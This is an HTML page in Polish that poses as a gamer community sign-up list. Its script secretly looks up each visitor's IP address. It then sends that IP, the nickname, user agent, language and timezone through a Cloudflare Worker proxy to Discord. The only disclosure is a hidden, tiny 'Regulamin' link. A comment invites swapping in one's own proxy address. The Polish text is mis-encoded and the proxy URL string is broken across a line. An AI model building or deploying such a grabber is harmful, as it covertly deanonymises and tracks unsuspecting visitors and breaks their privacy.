<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lista Graczy</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #74ebd5, #ACB6E5);
      min-height: 100vh;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    header {
      text-align: center;
      margin: 2rem 0;
      color: #222;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 0.5rem;
    }
    form {
      display: flex;
      gap: 0.5rem;
      margin-bottom: 1rem;
    }
    input {
      padding: 0.6rem;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 1rem;
    }
    button {
      background: #4a90e2;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 0.6rem 1.2rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #357ABD;
    }
    ul {
      list-style: none;
      padding: 0;
      width: 80%;
      max-width: 400px;
    }
    li {
      background: white;
      margin: 0.4rem 0;
      padding: 0.6rem;
      border-radius: 10px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      animation: fadeIn 0.5s ease;
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(5px);}
      to {opacity: 1; transform: translateY(0);}
    }
    footer {
      margin-top: auto;
      padding: 1rem;
      font-size: 0.7rem;
      color: #555;
      text-align: center;
    }
    #regulamin {
      display: none;
      font-size: 0.7rem;
      color: #444;
      margin-top: 0.5rem;
    }
    #toggleRegulamin {
      font-size: 0.6rem;
      color: #777;
      cursor: pointer;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <header>
    <h1>DoÅ‚Ä…cz do spoÅ‚ecznoÅ›ci graczy</h1>
    <p>Wpisz swÃ³j nick, aby doÅ‚Ä…czyÄ‡ do listy</p>
  </header>

  <form id="playerForm">
    <input type="text" id="nickname" placeholder="TwÃ³j nick..." required>
    <button type="submit">Dodaj</button>
  </form>

  <ul id="playerList"></ul>

  <footer>
    <span id="toggleRegulamin">Regulamin</span>
    <div id="regulamin">
      DoÅ‚Ä…czajÄ…c akceptujesz, Å¼e zbieramy dane takie jak IP, przeglÄ…darka, jÄ™zyk i strefa czasowa.
    </div>
  </footer>

  <script>
    const form = document.getElementById("playerForm");
    const input = document.getElementById("nickname");
    const list = document.getElementById("playerList");
    const toggleReg = document.getElementById("toggleRegulamin");
    const regulamin = document.getElementById("regulamin");

    // ZaÅ‚aduj graczy z localStorage
    let players = JSON.parse(localStorage.getItem("players")) || [];
    players.forEach(nick => addToList(nick));

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const nickname = input.value.trim();
      if (!nickname) return;

      addToList(nickname);
      players.push(nickname);
      localStorage.setItem("players", JSON.stringify(players));

      input.value = "";

      // Pobierz IP
      let ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(()=>({ip:"unknown"}));

      // WyÅ›lij do Cloudflare Worker proxy
      fetch("https://workers-playground-super-mouse-fc07.witunuipl.workers.dev
", {   // ðŸ”´ PODMIEN TO NA SWÃ“J ADRES PROXY
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `ðŸ‘¤ Nowy gracz: ${nickname}\nðŸŒ IP: ${ipData.ip}\nðŸ’» PrzeglÄ…darka: ${navigator.userAgent}\nðŸ—£ JÄ™zyk: ${navigator.language}\nâ° Strefa czasowa: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
        })
      }).then(res => console.log("WysÅ‚ano na Discord:", res.status))
        .catch(err => console.error("BÅ‚Ä…d proxy:", err));
    });

    function addToList(nick) {
      const li = document.createElement("li");
      li.textContent = nick;
      list.appendChild(li);
    }

    toggleReg.addEventListener("click", () => {
      regulamin.style.display = regulamin.style.display === "none" ? "block" : "none";
    });
  </script>
</body>
</html>
